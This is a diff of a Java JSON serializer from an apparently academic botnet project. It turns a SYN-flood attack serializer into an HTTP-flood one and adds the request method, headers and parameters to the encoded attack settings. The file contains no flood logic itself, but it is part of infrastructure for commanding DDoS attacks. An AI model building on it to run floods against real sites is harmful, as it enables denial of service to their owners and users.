@@ -24,9 +24,10 @@
   THE SOFTWARE.
  */
 
-package com.acmutv.botnet.core.attack.serial;
+package com.acmutv.botnet.core.attack.flooding.serial;
 
-import com.acmutv.botnet.core.attack.SynFloodAttack;
+import com.acmutv.botnet.core.attack.flooding.HttpFloodAttack;
+import com.acmutv.botnet.tool.net.HttpMethod;
 import com.acmutv.botnet.tool.net.HttpProxy;
 import com.acmutv.botnet.tool.time.Interval;
 import com.fasterxml.jackson.core.JsonGenerator;
@@ -35,43 +36,47 @@ import com.fasterxml.jackson.databind.ser.std.StdSerializer;
 
 import java.io.IOException;
 import java.net.URL;
+import java.util.Map;
 
 /**
- * The JSON serializer for {@link SynFloodAttack}.
+ * The JSON serializer for {@link HttpFloodAttack}.
  * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
  * @author Michele Porretta {@literal <mporretta@acm.org>}
  * @since 1.0
- * @see SynFloodAttack
- * @see SynFloodAttackDeserializer
+ * @see HttpFloodAttack
+ * @see HttpFloodAttackDeserializer
  */
-public class SynFloodAttackSerializer extends StdSerializer<SynFloodAttack> {
+public class HttpFloodAttackSerializer extends StdSerializer<HttpFloodAttack> {
 
   /**
-   * The singleton of {@link SynFloodAttackSerializer}.
+   * The singleton of {@link HttpFloodAttackSerializer}.
    */
-  private static SynFloodAttackSerializer instance;
+  private static HttpFloodAttackSerializer instance;
 
   /**
-   * Returns the singleton of {@link SynFloodAttackSerializer}.
+   * Returns the singleton of {@link HttpFloodAttackSerializer}.
    * @return the singleton.
    */
-  public static SynFloodAttackSerializer getInstance() {
+  public static HttpFloodAttackSerializer getInstance() {
     if (instance == null) {
-      instance = new SynFloodAttackSerializer();
+      instance = new HttpFloodAttackSerializer();
     }
     return instance;
   }
 
   /**
-   * Initializes the singleton of {@link SynFloodAttackSerializer}.
+   * Initializes the singleton of {@link HttpFloodAttackSerializer}.
    */
-  private SynFloodAttackSerializer() {
-    super((Class<SynFloodAttack>) null);
+  private HttpFloodAttackSerializer() {
+    super((Class<HttpFloodAttack>) null);
   }
 
   @Override
-  public void serialize(SynFloodAttack value, JsonGenerator gen, SerializerProvider provider) throws IOException {
+  public void serialize(HttpFloodAttack value, JsonGenerator gen, SerializerProvider provider) throws IOException {
     gen.writeStartObject();
+
+    final HttpMethod method = value.getMethod();
+    gen.writeStringField("method", method.name());
 
     final URL target = value.getTarget();
     gen.writeStringField("target", target.toString());
@@ -91,6 +96,25 @@ public class SynFloodAttackSerializer extends StdSerializer<SynFloodAttack> {
       gen.writeStringField("period", null);
     } else {
       gen.writeStringField("period", period.toString());
+    }
+
+    final Map<String,String> header = value.getHeader();
+    if (header != null) {
+      gen.writeObjectFieldStart("header");
+      for (Map.Entry<String,String> property : header.entrySet()) {
+        gen.writeStringField(property.getKey(), property.getValue());
+      }
+      gen.writeEndObject();
+    }
+
+
+    final Map<String,String> params = value.getParams();
+    if (params != null) {
+      gen.writeObjectFieldStart("params");
+      for (Map.Entry<String,String> property : params.entrySet()) {
+        gen.writeStringField(property.getKey(), property.getValue());
+      }
+      gen.writeEndObject();
     }
 
     gen.writeEndObject();
